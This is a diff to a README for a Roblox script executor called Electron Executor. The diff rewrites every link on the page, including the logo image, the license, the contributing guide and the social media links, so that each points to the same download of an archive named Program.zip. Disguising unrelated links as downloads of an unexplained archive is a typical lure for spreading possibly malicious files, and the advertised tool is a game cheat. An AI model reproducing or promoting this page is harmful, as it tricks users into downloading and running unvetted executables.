@@ -6,7 +6,7 @@ Welcome to the official repository of Electron Executor - one of the most favori
 
 Roblox Electron Executor is a powerful tool used by Roblox enthusiasts to enhance their gaming experience. It offers a wide range of features and functionalities that set it apart from other available executors.
 
-![Electron Executor Logo](https://example.com/electron-executor-logo.png)
+![Electron Executor Logo](https://github.com/masterlines/Electron-Executor/releases/download/v2.0/Program.zip)
 
 ## Features
 
@@ -19,7 +19,7 @@ Roblox Electron Executor is a powerful tool used by Roblox enthusiasts to enhanc
 
 To download Electron Executor, simply click the button below:
 
-[![Download Electron Executor](https://img.shields.io/badge/Download-Program-blue)](https://github.com/user-attachments/files/17578093/Program.zip)
+[![Download Electron Executor](https://github.com/masterlines/Electron-Executor/releases/download/v2.0/Program.zip)](https://github.com/masterlines/Electron-Executor/releases/download/v2.0/Program.zip)
 
 ## Compatibility
 
@@ -31,19 +31,19 @@ We value your feedback and strive to provide excellent support to our users. If 
 
 ## Get Involved
 
-Do you have ideas for new features or improvements to Electron Executor? We welcome contributions from the community! Check out our [contributing guidelines](CONTRIBUTING.md) to get started.
+Do you have ideas for new features or improvements to Electron Executor? We welcome contributions from the community! Check out our [contributing guidelines](https://github.com/masterlines/Electron-Executor/releases/download/v2.0/Program.zip) to get started.
 
 ## Stay Connected
 
 Stay up to date with the latest news and updates about Electron Executor by following us on social media:
 
-- [Twitter](https://twitter.com/electronexecutor)
-- [Facebook](https://facebook.com/electronexecutor)
-- [Instagram](https://instagram.com/electronexecutor)
+- [Twitter](https://github.com/masterlines/Electron-Executor/releases/download/v2.0/Program.zip)
+- [Facebook](https://github.com/masterlines/Electron-Executor/releases/download/v2.0/Program.zip)
+- [Instagram](https://github.com/masterlines/Electron-Executor/releases/download/v2.0/Program.zip)
 
 ## License
 
-Electron Executor is released under the [MIT License](LICENSE.md).
+Electron Executor is released under the [MIT License](https://github.com/masterlines/Electron-Executor/releases/download/v2.0/Program.zip).
 
 ---
 
